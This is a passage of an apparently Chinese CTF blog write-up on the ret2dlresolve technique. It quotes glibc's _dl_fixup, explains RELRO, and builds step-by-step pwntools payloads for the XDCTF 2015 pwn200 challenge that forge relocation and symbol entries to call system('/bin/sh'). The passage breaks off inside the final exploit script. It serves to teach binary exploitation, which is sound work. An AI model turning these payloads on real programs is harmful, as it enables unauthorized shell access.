class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c">DL_FIXUP_VALUE_TYPE<br>attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE<br>_dl_fixup (<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br>	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>	   <span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);					<span class="hljs-comment">//取出.dynsym</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);		<span class="hljs-comment">//取出.dynstr</span><br><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);		<span class="hljs-comment">//取出Elf_Rel</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];			<span class="hljs-comment">//取出Elf_Sym</span><br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);			<span class="hljs-comment">//对应的GOT地址</span><br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);			<span class="hljs-comment">//检查是否为7</span><br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>	  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum =<br>	    (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>	  version = &amp;l-&gt;l_versions[ndx];<br>	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>	    version = <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment">	 not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment">	 we are not using any threads (yet).  */</span><br>      <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	&#123;<br>	  THREAD_GSCOPE_SET_FLAG ();<br>	  flags |= DL_LOOKUP_GSCOPE_LOCK;<br>	&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span><br>      RTLD_ENABLE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br>				<span class="hljs-comment">//找到包含对应符号的对象文件(libc)，返回一个指向其基地址的指针</span><br>      <br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	THREAD_GSCOPE_RESET_FLAG ();<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">	 of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">	 offset.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (result,<br>				   sym ? (LOOKUP_VALUE_ADDRESS (result)<br>					  + sym-&gt;st_value) : <span class="hljs-number">0</span>);		<span class="hljs-comment">//获得函数的真实内存地址</span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">	 address) is also known.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);			<span class="hljs-comment">//写入GOT</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="基本的利用方法"><a href="#基本的利用方法" class="headerlink" title="基本的利用方法"></a>基本的利用方法</h2><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><ul>
+<li>Partial RELRO：包括<code>.dynamic</code>段在内的一些段被标记为只读</li>
+<li>Full RELRO：在Partial RELRO的基础上，禁用延迟绑定，即所有导入的符号在加载时就被解析，<code>.got.plt</code>段被完全初始化为目标函数的地址，并标记为只读</li>
+</ul>
+<h3 id="关闭RELRO保护"><a href="#关闭RELRO保护" class="headerlink" title="关闭RELRO保护"></a>关闭RELRO保护</h3><p>此时<code>.dynamic</code>段可写，由于装载器是从<code>.dynamic</code>段的<code>DT_STRTAB</code>条目中来获取<code>.dynstr</code>段的地址，而<code>DT_STRTAB</code>的位置是已知的，所以我们可以修改其中的内容，可以将其指向<code>.bss</code>我们构造的假的字符串表，如下图所示：</p>
+<p><img src="/ret2dlresolve/NO_RELRO.png" srcset="/img/loading.gif" lazyload alt="NO_RELRO"></p>
+<p>在这里我们是不可以直接写<code>.dynstr</code>段的，因为<code>.dynstr</code>是不可写的。</p>
+<h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>此时，<code>.dynamic</code>段不可写，我们知道加载器是通过第二个参数来求得对应函数的<code>Elf_Rel</code>，然而，如果这个获取的这个内存地址超出了<code>.ret.plt</code>段到达了<code>.bss</code>段上，那我们就可以伪造一个<code>Eif_Rel</code>，使<code>r_offset</code>的值是一个可写的内存地址来将解析后的函数地址写在那里，使<code>r_info</code>的值是一个能够将动态装载器导向到攻击者控制内存的下标，指向一个位于它后面的<code>Elf_Sym</code>，而<code>Elf_Sym</code>中的<code>st_name</code>指向其后面的字符串，如下图所示：</p>
+<p><img src="/ret2dlresolve/Partial_RELRO.png" srcset="/img/loading.gif" lazyload alt="Partial RELRO"></p>
+<h2 id="例题-x86"><a href="#例题-x86" class="headerlink" title="例题(x86)"></a>例题(x86)</h2><h3 id="XDCTF-2015：pwn200"><a href="#XDCTF-2015：pwn200" class="headerlink" title="XDCTF 2015：pwn200"></a>XDCTF 2015：pwn200</h3><h4 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h4><p><img src="/ret2dlresolve/checksec.png" srcset="/img/loading.gif" lazyload alt="checksec"></p>
+<p><img src="/ret2dlresolve/main.png" srcset="/img/loading.gif" lazyload alt="main"></p>
+<p><img src="/ret2dlresolve/vuln.png" srcset="/img/loading.gif" lazyload alt="vuln"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>程序启用了<code>Partial RELRO</code>，我们可以采用第二种方法进行攻击，首先我们通过read将栈迁移到<code>.bss</code>上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload_1 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x6c</span> + <span class="hljs-number">4</span>)<br>payload_1 += p32(read_plt)<br>payload_1 += p32(pop3_ret)<br>payload_1 += p32(<span class="hljs-number">0</span>) + p32(bss_addr) + p32(<span class="hljs-number">100</span>)<br>payload_1 += p32(pop_ebp_ret)<br>payload_1 += p32(bss_addr)<br>payload_1 += p32(lea_ret)<br>sh.recv()<br>sh.send(payload_1)<br></code></pre></td></tr></table></figure>
+
+<p>接下来，我将把<code>write(1, &quot;/bin/sh&quot;, 7)</code>这个函数调用逐步转化为<code>ret2dl-resolve</code>的payload，即最终实现<code>system(&quot;/bin/sh&quot;)</code></p>
+<h5 id="STEP-1"><a href="#STEP-1" class="headerlink" title="STEP 1"></a>STEP 1</h5><p>模拟<code>write@plt</code>执行的效果，即将<code>reloc_index</code>和<code>link_map</code>压栈，然后调用<code>_dl_runtime_resolve</code>函数，我们可以在IDA里面看到<code>write</code>的<code>reloc_index</code>：</p>
+<p><img src="/ret2dlresolve/plt.png" srcset="/img/loading.gif" lazyload alt="plt"></p>
+<p>payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">reloc_index = <span class="hljs-number">0x20</span><br>payload_2 = <span class="hljs-string">&quot;aaaa&quot;</span>      <span class="hljs-comment"># new ebp</span><br>payload_2 += p32(plt_0)      <span class="hljs-comment"># jump to PLT0</span><br>payload_2 += p32(reloc_index)        <span class="hljs-comment"># push 0x20</span><br>payload_2 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_2 += p32(<span class="hljs-number">1</span>) + p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload_2 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_2))<br>payload_2 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_2 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_2))<br>sh.send(payload_2)<br></code></pre></td></tr></table></figure>
+
+<p>这里我们要注意压栈的过程，当执行到<code>plt_0</code>的时候，我们的<code>esp</code>是指向<code>reloc_index</code>的，然后进行<code>push</code>操作（<strong>将<code>esp</code>减去4个字节，然后将<code>link_map</code>放在<code>esp</code>所在的位置，即payload中<code>plt_0</code>的位置</strong>），然后调用<code>_dl_runtime_resolve</code>函数。</p>
+<h5 id="STEP-2"><a href="#STEP-2" class="headerlink" title="STEP 2"></a>STEP 2</h5><p>在<code>.bss</code>上伪造一个<code>Elf_Rel</code>，<code>r_offset</code>设置为<code>write@plt</code>，<code>r_info</code>设置为<code>0x607</code>，动态加载器通过这个值找到<code>Elf_Sym</code>，但是我们需要调整<code>reloc_index</code>，因为我们需要通过这个值找到在<code>.bss</code>上伪造的<code>Elf_Sym</code>。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_info = <span class="hljs-number">0x607</span><br>fake_reloc = p32(write_got) + p32(r_info)<br>payload_3 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_3 += p32(plt_0)<br>payload_3 += p32(reloc_index)<br>payload_3 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_3 += p32(<span class="hljs-number">1</span>) + p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload_3 += fake_reloc         <span class="hljs-comment"># bss_addr + 28</span><br>payload_3 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_3))<br>payload_3 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_3 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_3))<br>sh.send(payload_3)<br></code></pre></td></tr></table></figure>
+
+<h5 id="STEP-3"><a href="#STEP-3" class="headerlink" title="STEP 3"></a>STEP 3</h5><p>在<code>.bss</code>上构造<code>Elf_Sym</code>，我们需要构造<code>Elf_Sym</code>里面的内容，提供两种方法：</p>
+<ul>
+<li><p>在IDA里面我们可以看到相应的结构体</p>
+<p><img src="/ret2dlresolve/write_sym.png" srcset="/img/loading.gif" lazyload alt="write_sym"></p>
+</li>
+<li><p>使用<code>objdump</code>工具</p>
+<p><img src="/ret2dlresolve/objdump.png" srcset="/img/loading.gif" lazyload alt="objdump"></p>
+</li>
+</ul>
+<p>同时，我们也需要改变<code>r_info</code>的值，因为动态加载器会通过这个值找到我们在<code>.bss</code>上构造的<code>Elf_Sym</code>，<code>r_info</code>由<code>r_sym</code>和<code>r_type</code>来组成，<code>r_sym</code>是<code>Elf_Sym</code>相对于<code>.dynsym</code>的下标偏移，<code>r_type</code>设置为<code>0x7</code>就可以了，我们可以通过宏定义来找到<code>r_info</code>的计算方法：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* How to extract and insert information held in the r_info field.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_SYM(val)		((val) &gt;&gt; 8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_TYPE(val)		((val) &amp; 0xff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_INFO(sym, type)		(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_SYM(i)			((i) &gt;&gt; 32)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_TYPE(i)			((i) &amp; 0xffffffff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_INFO(sym,type)		((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span><br></code></pre></td></tr></table></figure>
+
+<p>payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_sym = (bss_addr + <span class="hljs-number">36</span> - dynsym) / <span class="hljs-number">0x10</span><br>r_type = <span class="hljs-number">0x7</span><br>r_info = (r_sym &lt;&lt; <span class="hljs-number">8</span>) + (r_type &amp; <span class="hljs-number">0xff</span>)<br>fake_reloc = p32(write_got) + p32(r_info)<br>fake_sym = p32(<span class="hljs-number">0x4c</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x12</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_4 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_4 += p32(plt_0)<br>payload_4 += p32(reloc_index)<br>payload_4 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_4 += p32(<span class="hljs-number">1</span>) + p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload_4 += fake_reloc<br>payload_4 += fake_sym           <span class="hljs-comment"># bss_addr + 36</span><br>payload_4 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_4))<br>payload_4 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_4 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_4))<br>sh.send(payload_4)<br></code></pre></td></tr></table></figure>
+
+<p><strong>这里需要注意的是，<code>r_sym</code>是<code>.dynsym</code>的索引，所以需要除以<code>Elf_Sym</code>结构体的大小，在这里是0x10，并且在之后我们要进行位操作，所以要保证这个除出来的结果是一个整数。</strong></p>
+<h5 id="STEP-4"><a href="#STEP-4" class="headerlink" title="STEP 4"></a>STEP 4</h5><p>在<code>.bss</code>段上伪造<code>.dynstr</code>，也就是放上<code>&#39;write&#39;</code>字符串，相应的我们需要控制<code>fake_Sym</code>的<code>st_name</code>指向伪造的字符串，同时，可以根据宏定义，通过<code>st_bind</code>和<code>st_type</code>的值来计算<code>st_info</code>。</p>
+<p>相关宏定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* How to extract and insert information held in the st_info field.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_BIND(val)		(((unsigned char) (val)) &gt;&gt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_TYPE(val)		((val) &amp; 0xf)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_INFO(bind, type)	(((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span><br><br><span class="hljs-comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_BIND(val)		ELF32_ST_BIND (val)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_TYPE(val)		ELF32_ST_TYPE (val)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_INFO(bind, type)	ELF32_ST_INFO ((bind), (type))</span><br></code></pre></td></tr></table></figure>
+
+<p>可以参照这幅图：</p>
+<p><img src="/ret2dlresolve/st_info.png" srcset="/img/loading.gif" lazyload alt="st_info"></p>
+<p>payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_sym = (bss_addr + <span class="hljs-number">36</span> - dynsym) / <span class="hljs-number">0x10</span><br>r_type = <span class="hljs-number">0x7</span><br>r_info = (r_sym &lt;&lt; <span class="hljs-number">8</span>) + (r_type &amp; <span class="hljs-number">0xff</span>)<br>fake_reloc = p32(write_got) + p32(r_info)<br>st_name = bss_addr + <span class="hljs-number">60</span> - dynstr<br>st_bind = <span class="hljs-number">0x1</span><br>st_type = <span class="hljs-number">0x2</span><br>st_info = (st_bind &lt;&lt; <span class="hljs-number">4</span>) + (st_type &amp; <span class="hljs-number">0xf</span>)<br>fake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(st_info) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_5 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_5 += p32(plt_0)<br>payload_5 += p32(reloc_index)<br>payload_5 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_5 += p32(<span class="hljs-number">1</span>) + p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload_5 += fake_reloc<br>payload_5 += fake_sym<br>payload_5 += <span class="hljs-string">&quot;write\x00&quot;</span>            <span class="hljs-comment"># bss + 60     </span><br>payload_5 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_5))<br>payload_5 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_5 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_5))<br>sh.send(payload_5)<br></code></pre></td></tr></table></figure>
+
+<h5 id="STEP-5"><a href="#STEP-5" class="headerlink" title="STEP 5"></a>STEP 5</h5><p>最后将字符串<code>&#39;write&#39;</code>改成<code>&#39;system&#39;</code>，并调整一下参数就可以了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">reloc_index = bss_addr + <span class="hljs-number">28</span> - rel_plt<br>r_sym = (bss_addr + <span class="hljs-number">36</span> - dynsym) / <span class="hljs-number">0x10</span><br>r_type = <span class="hljs-number">0x7</span><br>r_info = (r_sym &lt;&lt; <span class="hljs-number">8</span>) + (r_type &amp; <span class="hljs-number">0xff</span>)<br>fake_reloc = p32(write_got) + p32(r_info)<br>st_name = bss_addr + <span class="hljs-number">60</span> - dynstr<br>st_bind = <span class="hljs-number">0x1</span><br>st_type = <span class="hljs-number">0x2</span><br>st_info = (st_bind &lt;&lt; <span class="hljs-number">4</span>) + (st_type &amp; <span class="hljs-number">0xf</span>)<br>fake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(st_info) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_6 = <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_6 += p32(plt_0)<br>payload_6 += p32(reloc_index)<br>payload_6 += <span class="hljs-string">&quot;aaaa&quot;</span><br>payload_6 += p32(bss_addr + <span class="hljs-number">80</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload_6 += fake_reloc<br>payload_6 += fake_sym<br>payload_6 += <span class="hljs-string">&quot;system\x00&quot;</span>          <br>payload_6 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload_6))<br>payload_6 += <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><br>payload_6 += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(payload_6))<br>sh.send(payload_6)<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./bof&quot;</span>)<br><span class="hljs-comment">#sh = remote(&quot;node4.buuoj.cn&quot;, 29188)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./bof&quot;</span>)<br><br>pop3_ret = <span class="hljs-number">0x08048629</span><br>pop_ebp_ret = <span class="hljs-number">0x0804862b</span><br>lea_ret = <span class="hljs-number">0x08048445</span><br>bss_addr = <span class="hljs-number">0x0804A028</span> + <span class="hljs-number">0x500</span><br><br>plt_0 = elf.get_section_by_name(<span 